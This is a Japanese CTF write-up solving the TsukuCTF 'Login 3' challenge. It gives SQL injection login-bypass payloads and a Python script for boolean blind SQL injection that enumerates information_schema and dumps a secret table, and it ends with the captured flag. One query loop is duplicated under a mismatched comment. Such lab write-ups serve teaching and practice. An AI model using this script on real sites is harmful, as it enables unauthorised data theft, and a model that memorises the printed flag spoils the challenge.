---
title: Login3
description: Blind SQL injection
author: rikuta0811_dash
genre: Web
solver: 9
point: 472
---

# Login 3

> 筑紫くんは、これなら情報が流出するはずがないと自信満々です。果たして...
> 
> https://tsukuctf.sechack365.com/problems/login3
>
> ※ この問題では/problems/login3以下のみを用います。 他の問題/problems/<name>などと混同しないよう注意してください。

Login 1 ~ 3がセットでSQL injectionの問題になっています。
Login3では、Blind SQL injection というテクニックが要求されます。

Login 1, 2と同様に、Usernameを ``` ' or 1=1 ; -- ``` としてログインすると、ログインには成功しますが、ユーザー名等は表示されません。したがって、SQL injectionに対して脆弱ではあるものの、injectionしたSQL文の結果を確認することができません。
ここで、Usernameを ``` ' or 1=2 ; -- ```とすると、ログインできませんでしたと表示されます。ということは、```1=1```や```1=2```の部分にbool値をとる式を与えれば、その結果は取得できるということです。これを積み重ねてDB内の情報を抜く手法はBlind SQL injectionと呼ばれます。

information_schemaからの情報取得等の実行したいqueryに対して、「queryの実行結果のi文字目はasciiコードでxより大きいか?」というbool値をとるqueryを送信し、そのbool値を見ることで、2分探索でquery結果を取得していきます。流石に手動で入力するのは面倒くさいので、コードを書くことにします。

```python:blind.py
def _execAnyQuery_core(query, pos, mid):
    url = "https://tsukuctf.sechack365.com/problems/login3/login.php"
    
    #queryの pos文字目がasciiコードでmidより大きければtrue
    params={
        "name":"' or ascii(substring(({0}),{1},1))>={2} ; -- ".format(query,pos,mid),
        "password":"a"
    }
    page = requests.post(url, data=params)

    return "ようこそ" in page.text

def _execAnyQuery(query, pos):
    """
    2分探索でqueryの実行結果のpos文字目を取得する。
    """
    low = 0
    high = 256
    while high-low>1:
        mid = (high+low)//2
        if _execAnyQuery_core(query, pos, mid):
            low = mid
        else:
            high = mid
    return low
        
def execAnyQuery(query):
    i = 1
    while True:
        char = int(_execAnyQuery(query, i))
        if char==0:
            return
        print(chr(char), end="")
        i+=1
        
execAnyQuery("select version()") 
# >> 8.0.26
```

あとは、login2 と同様にテーブルを取得していきます。

```python:blind.py
for i in range(100):
    execAnyQuery("select distinct table_name from information_schema.columns limit 1 offset {0}".format(i))
    print()
# urtla_secret_tsukushiというtableがあることがわかる。

for i in range(10):
    execAnyQuery("select distinct column_name from information_schema.columns where table_name = 'urtla_secret_tsukushi' limit 1 offset {0}".format(i))
    print()
 
for i in range(33):
    execAnyQuery("select secret from urtla_secret_tsukushi limit 1 offset {0}".format(i))
# urtla_secret_tsukushiテーブルがidとsecretのカラムを持つことがわかる。
    
for i in range(33):
    execAnyQuery("select secret from urtla_secret_tsukushi limit 1 offset {0}".format(i))
#フラグが表示される。
```

フラグは

```txt
TsukuCTF{U_Are_Geni0us_T$UKUSH1}
```